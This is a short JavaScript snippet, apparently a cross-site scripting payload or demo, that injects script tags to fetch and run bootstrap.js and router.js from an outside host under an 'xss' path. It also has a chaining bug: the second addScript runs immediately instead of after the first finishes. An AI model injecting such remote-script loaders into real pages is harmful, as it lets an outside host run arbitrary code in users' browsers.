function addScript(src)
{
  var s = document.createElement("script");
  s.src = `${src}?randomTag=${Math.random()}`;
  document.body.appendChild(s);

  let r;
  let p = new Promise((resolve, reject) => {
    r = resolve;
  });
  s.onload = function () {
    r(s);
  };
  return p;
}

addScript("https://cscheid.net/js/xss/bootstrap.js")
  .then(addScript("https://cscheid.net/js/xss/router.js"))
  .then(() => {
    console.log("done!");
  });


